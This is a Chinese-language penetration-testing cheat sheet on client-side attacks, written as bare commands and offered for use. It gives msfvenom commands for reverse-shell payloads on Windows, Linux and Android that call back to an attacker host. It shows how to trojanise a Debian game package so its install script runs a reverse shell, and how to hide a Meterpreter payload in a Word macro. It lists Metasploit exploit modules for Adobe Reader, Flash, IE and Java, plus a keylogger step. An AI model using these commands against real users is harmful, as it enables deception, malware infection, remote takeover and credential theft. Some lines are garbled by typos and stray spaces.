# 客户端渗透
> 在无法突破网络边界的情况下转而攻击客户端.可以使用社会工程学的方式将恶意代码发给渗透目标,诱骗目标执行payload, 成功利用之后, 进而渗透线上的业务网络.

## 0x02 主要方式
+ 含有漏洞利用代码的WEB站点(主要是利用浏览器客户端漏洞)
+ 含有漏洞利用代码的Doc, PDF等文档
+ 恶意执行程序

## 0x03 恶意程序
### Windows
-	msfvenom --payload-options -p windows/shell/reverse_tcp
-	msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=1.1.1.1 LPORT=4444 -b "\x00" -e x86/shikata_ga_nai -f exe -o 1.exe
-	msfconsole
    -	use exploit/multi/handler
    -	set payload windows/shell/reverse_tcp
    -	set LHOST 1.1.1.1
    -	set LPORT 4444
    -	exploit

### Linux 
-	apt download freesweep   # 或 apt-get --download-only install freesweep（apt-get 已被 apt 替代）
-	dpkg -x freesweep_0.90-1_i386.deb free
-	mkdir free/DEBIAN && cd free/DEBIAN
-	vi control
-	vi postinst

```
#!/bin/sh
sudo chmod 2755
/usr/games/freesweep_scores && /usr/games/ freesweep_scores & /usr/games/freesweep 
```
-	msfvenom -a x86 --platform linux -p linux/x86/shell/reverse_tcp LHOST=1.1.1.1 LPORT=4444 -b "\x00" -f elf -o /root/free/usr/games/ freesweep_scores
-	chmod 755 postinst
-	dpkg-deb --build /root/free

### Android
-	use payload/android/meterpreter/reverse_tcp
-	generate -f a.apk -p android -t raw
 


## 0x04 恶意文件
### PDF
> 利用Acrobat Reader漏洞执行payload
-	构造PDF文件：exploit/windows/fileformat/adobe_utilprintf
-	构造恶意网站：exploit/windows/browser/adobe_utilprintf
-	meterpreter
    -	use priv
    -	run post/windows/capture/keylog_recorder

### Word
> VBScript 感染方式,利用 宏 感染 word、excel文档, 可以绕过某些基于文件类型检查的安全机制
-	生 成 vbscript 脚 本 ：
    -	msfvenom -a x86 --platform windows -p windows/ meterpreter/reverse_tcp LHOST=1.1.1.1 LPORT=4444 -e x86/shikata_ga_nai
-f vba-exe
-	Office 2007 +
    -	视图——宏——创建
    -	Payload 第—部分粘入VBA代码;
    -	Payload 第二部分粘入word文档正文;
-	Msf 启动侦盺
    -	use exploit/multi/handler
    -	set payload windows/meterpreter/reverse_tcp
    - run



## 0x05 恶意网站
-	利用Flash插件涌洞执行payload
    -	use exploit/multi/browser/adobe_flash_hacking_team_uaf
    -	use exploit/multi/browser/adobe_flash_opaque_background_uaf
    -	use auxiliary/server/browser_autopwn2
- 利用 IE 浏览器涌洞执行payload
    -	use exploit/windows/browser/ms14_064_ole_code_execution

-	利用 JRE 涌洞执行payload
    -	use exploit/multi/browser/java_jre17_driver_manager
    -	use exploit/multi/browser/java_jre17_jmxbean
    -	use exploit/multi/browser/java_jre17_reflection_types

-	meterpreter
    -	use priv
    -	run post/windows/capture/keylog_recorder
